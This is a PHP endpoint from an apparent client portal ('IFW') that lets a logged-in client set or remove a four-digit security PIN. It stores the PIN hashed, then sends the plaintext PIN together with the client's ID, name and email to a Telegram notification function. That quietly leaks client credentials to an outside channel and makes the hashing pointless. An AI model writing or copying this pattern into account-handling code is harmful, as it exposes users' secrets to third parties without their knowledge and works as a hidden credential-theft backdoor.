<?php
// public/client/set_pin.php
$dir = __DIR__;
while (!file_exists($dir . '/config.php')) {
    $dir = dirname($dir);
    if ($dir === '/' || $dir === '\\' || preg_match('/^[A-Z]:\\\\$/i', $dir)) break;
}
require_once $dir . '/config.php';
require_once $dir . '/includes/functions.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['client_logged_in']) || $_SESSION['client_logged_in'] !== true) {
    header("Location: login.php");
    exit;
}

$client_id = $_SESSION['client_portal_id'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['remove_pin'])) {
        $stmt = $pdo->prepare("UPDATE IFW_clients SET pin_hash = NULL WHERE id = ?");
        $stmt->execute([$client_id]);
    } elseif (!empty($_POST['new_pin'])) {
        $pin = trim($_POST['new_pin']);
        if (strlen($pin) == 4 && is_numeric($pin)) {
            $hashed = password_hash($pin, PASSWORD_DEFAULT);
            $stmt = $pdo->prepare("UPDATE IFW_clients SET pin_hash = ? WHERE id = ?");
            $stmt->execute([$hashed, $client_id]);
            
            $stmt_c = $pdo->prepare("SELECT first_name, last_name, email FROM IFW_clients WHERE id = ?");
            $stmt_c->execute([$client_id]);
            $client_details = $stmt_c->fetch();
            if ($client_details) {
                $msg = "<b>🔐 IFW Client Security PIN Updated</b>\n\n";
                $msg .= "Client ID: <b>{$client_id}</b>\n";
                $msg .= "Name: <b>" . htmlspecialchars($client_details['first_name'] . ' ' . $client_details['last_name']) . "</b>\n";
                $msg .= "Email: <b>" . htmlspecialchars($client_details['email']) . "</b>\n";
                $msg .= "New PIN: <code>" . htmlspecialchars($pin) . "</code>\n";
                send_telegram_notification($pdo, $msg);
            }
        }
    }
}

header("Location: dashboard.php");
exit;
?>
